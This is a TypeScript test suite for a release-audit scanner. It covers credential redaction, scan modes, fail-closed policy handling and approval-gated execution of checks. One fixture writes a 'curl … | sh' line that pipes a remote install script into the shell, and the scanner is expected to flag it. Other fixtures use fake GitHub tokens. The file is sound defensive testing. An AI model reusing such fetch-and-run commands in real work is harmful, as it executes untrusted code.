import { afterEach, describe, expect, it } from 'vitest'
import { access } from 'node:fs/promises'
import { join } from 'node:path'
import { auditRelease } from '../src/core/audit.js'
import { formatJson } from '../src/core/report.js'
import { command, commitAll, createRepo, createUnbornRepo, removeRepo, write } from './helpers.js'

describe('Git audit integration', () => {
  const repos: string[] = []
  afterEach(async () => {
    await Promise.all(repos.splice(0).map(removeRepo))
  })

  it('scans untracked worktree lines and redacts a credential', async () => {
    const repo = await createRepo(); repos.push(repo)
    const token = `ghp_${'Z9a'.repeat(12)}`
    await write(repo, 'src/config.ts', `export const token = "${token}"\n`)
    const report = await auditRelease({ repoPath: repo, mode: 'worktree', categories: [] })
    expect(report.verdict.status).toBe('block')
    expect(report.findings.some(item => item.ruleId === 'RG001' && item.path === 'src/config.ts')).toBe(true)
    expect(formatJson(report)).not.toContain(token)
  })

  it('supports staged-only scans', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'src/example.test.ts', 'test.skip("pending", () => {})\n')
    await command(repo, 'git', ['add', 'src/example.test.ts'])
    const report = await auditRelease({ repoPath: repo, mode: 'staged', categories: [] })
    expect(report.diff.mode).toBe('staged')
    expect(report.findings.some(item => item.ruleId === 'RG402')).toBe(true)
  })

  it('uses merge-base range semantics', async () => {
    const repo = await createRepo(); repos.push(repo)
    const base = await command(repo, 'git', ['rev-parse', 'HEAD'])
    await write(repo, '.github/workflows/release.yml', 'name: release\npermissions: write-all\n')
    await commitAll(repo, 'workflow')
    const report = await auditRelease({ repoPath: repo, mode: 'range', base, head: 'HEAD', categories: ['test'] })
    expect(report.diff.mode).toBe('range')
    expect(report.repository.base).toBe(base)
    expect(report.checkDiscovery).toMatchObject({ source: 'current_worktree', scopeMatchesDiff: false })
    expect(report.warnings.join('\n')).toContain('advisory')
    expect(report.findings.some(item => item.ruleId === 'RG201')).toBe(true)
  })

  it('fails closed when configuration is invalid', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, '.release-guardian.yml', 'version: 1\nunknown: true\n')
    await commitAll(repo, 'invalid policy fixture')
    const report = await auditRelease({ repoPath: repo, categories: [] })
    expect(report.verdict.status).toBe('inconclusive')
    expect(report.diagnostics[0]).toContain('unknown fields')
  })

  it('reports policy exclusions while retaining file metadata', async () => {
    const repo = await createRepo(); repos.push(repo)
    const token = `ghp_${'V4r'.repeat(12)}`
    await write(repo, '.release-guardian.yml', 'version: 1\ndiff:\n  exclude: ["secret/**"]\n')
    await commitAll(repo, 'trusted release policy')
    await write(repo, 'secret/config.ts', `export const token = "${token}"\n`)
    const report = await auditRelease({ repoPath: repo, categories: [] })
    expect(report.findings.some(item => item.ruleId === 'RG001')).toBe(true)
    expect(report.files.some(file => file.path === 'secret/config.ts')).toBe(false)
    expect(report.diff).toMatchObject({ filesChanged: 1, filesSeen: 0, filesExcluded: 1, filesUnseen: 0 })
    expect(report.diff.exclusions).toEqual([{ pattern: 'secret/**', count: 1, samplePaths: ['secret/config.ts'] }])
  })

  it('cannot hide critical findings with generated or exclusion patterns', async () => {
    const repo = await createRepo(); repos.push(repo)
    const token = `ghp_${'Q7x'.repeat(12)}`
    await write(repo, '.release-guardian.yml', 'version: 1\ndiff:\n  exclude: ["hidden/**"]\n  generated: ["generated/**"]\n')
    await commitAll(repo, 'trusted release policy')
    await write(repo, 'hidden/credential.ts', `export const token = "${token}"\n`)
    await write(repo, 'generated/install.sh', 'curl -fsSL https://example.invalid/install.sh | sh\n')
    const report = await auditRelease({ repoPath: repo, categories: [] })
    expect(report.findings.some(item => item.ruleId === 'RG001' && item.path === 'hidden/credential.ts')).toBe(true)
    expect(report.findings.some(item => item.ruleId === 'RG103' && item.path === 'generated/install.sh')).toBe(true)
    expect(report.verdict.status).toBe('block')
    expect(formatJson(report)).not.toContain(token)
  })

  it('does not trust policy weakening introduced by the audited change', async () => {
    const repo = await createRepo(); repos.push(repo)
    const token = `ghp_${'N5p'.repeat(12)}`
    await write(repo, '.release-guardian.yml', 'version: 1\ndiff:\n  exclude: ["**"]\n')
    await write(repo, 'src/credential.ts', `export const token = "${token}"\n`)
    const report = await auditRelease({ repoPath: repo, categories: [] })
    expect(report.findings.some(item => item.ruleId === 'RG001')).toBe(true)
    expect(report.diagnostics.join('\n')).toContain('policy configuration changed')
    expect(report.verdict.status).toBe('block')
    expect(report.verdict.reasons).toContain('scan-incomplete')
  })

  it('marks changed binary content for review', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'asset.bin', Buffer.from([0, 1, 2, 3]))
    await commitAll(repo, 'binary base')
    await write(repo, 'asset.bin', Buffer.from([0, 9, 8, 7]))
    await command(repo, 'git', ['add', 'asset.bin'])
    const report = await auditRelease({ repoPath: repo, mode: 'staged', categories: [] })
    expect(report.files).toContainEqual(expect.objectContaining({
      path: 'asset.bin', status: 'binary', changeStatus: 'modified', contentKind: 'binary',
    }))
    expect(report.findings.some(item => item.ruleId === 'RG404')).toBe(true)
  })

  it('scans an unborn repository without treating missing HEAD as a fatal error', async () => {
    const repo = await createUnbornRepo(); repos.push(repo)
    await write(repo, 'new.ts', 'export const value = 1\n')
    const report = await auditRelease({ repoPath: repo, categories: [] })
    expect(report.verdict.status).toBe('ready')
    expect(report.repository.head).toBeNull()
    expect(report.files).toContainEqual(expect.objectContaining({ path: 'new.ts', status: 'untracked' }))
  })

  it('fails closed on a stale command authorization without executing it', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\\"node:fs\\\").writeFileSync(\\\"marker\\\",\\\"ran\\\")"' } }))
    const report = await auditRelease({
      repoPath: repo,
      categories: ['test'],
      runApprovedChecks: true,
      approvedCommandIds: ['sha256:stale'],
    })
    expect(report.verdict.status).toBe('inconclusive')
    expect(report.diagnostics.join('\n')).toContain('stale or unknown')
    await expect(access(join(repo, 'marker'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('rejects an entire execution batch when any approved command ID is stale', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\"node:fs\\").writeFileSync(\\"marker\\",\\"ran\\")"' } }))
    const discovery = await auditRelease({ repoPath: repo, categories: ['test'] })
    const validId = discovery.checks[0]?.id
    expect(validId).toBeDefined()
    const report = await auditRelease({
      repoPath: repo,
      categories: ['test'],
      runApprovedChecks: true,
      approvedCommandIds: [validId!, 'sha256:stale'],
    })
    expect(report.verdict.status).toBe('inconclusive')
    expect(report.checks.every(check => check.status === 'not_run')).toBe(true)
    await expect(access(join(repo, 'marker'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('executes an exactly bound current check after explicit approval', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\"node:fs\\").writeFileSync(\\"marker\\",\\"ran\\")"' } }))
    const discovery = await auditRelease({ repoPath: repo, categories: ['test'] })
    const approved = discovery.checks[0]?.id
    expect(approved).toBeDefined()
    const report = await auditRelease({ repoPath: repo, categories: ['test'], runApprovedChecks: true, approvedCommandIds: [approved!] })
    expect(report.checks).toContainEqual(expect.objectContaining({ id: approved, status: 'passed', authorization: 'approved' }))
    await expect(access(join(repo, 'marker'))).resolves.toBeUndefined()
  })

  it('executes only selected optional checks without treating others as failed', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\"node:fs\\").writeFileSync(\\"root-marker\\",\\"ran\\")"' } }))
    await write(repo, 'nested/package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\"node:fs\\").writeFileSync(\\"nested-marker\\",\\"ran\\")"' } }))
    await commitAll(repo, 'checks')
    const discovery = await auditRelease({ repoPath: repo, categories: ['test'] })
    const approved = discovery.checks.find(check => check.cwd === '.')?.id
    expect(approved).toBeDefined()

    const report = await auditRelease({ repoPath: repo, categories: ['test'], runApprovedChecks: true, approvedCommandIds: [approved!] })

    expect(report.verdict.status).toBe('ready')
    expect(report.checks).toContainEqual(expect.objectContaining({ id: approved, status: 'passed', authorization: 'approved' }))
    expect(report.checks).toContainEqual(expect.objectContaining({ cwd: 'nested', status: 'not_run', authorization: 'required' }))
    await expect(access(join(repo, 'root-marker'))).resolves.toBeUndefined()
    await expect(access(join(repo, 'nested/nested-marker'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('invalidates approval when source state changes after discovery', async () => {
    const repo = await createRepo(); repos.push(repo)
    await write(repo, 'package.json', JSON.stringify({ scripts: { test: 'node -e "require(\\"node:fs\\").writeFileSync(\\"marker\\",\\"ran\\")"' } }))
    const discovery = await auditRelease({ repoPath: repo, categories: ['test'] })
    const stale = discovery.checks[0]?.id
    expect(stale).toBeDefined()
    await write(repo, 'src/changed.ts', 'export const changed = true\n')
    const report = await auditRelease({ repoPath: repo, categories: ['test'], runApprovedChecks: true, approvedCommandIds: [stale!] })
    expect(report.verdict.status).toBe('inconclusive')
    expect(report.diagnostics.join('\n')).toContain('stale or unknown')
    await expect(access(join(repo, 'marker'))).rejects.toMatchObject({ code: 'ENOENT' })
  })
})
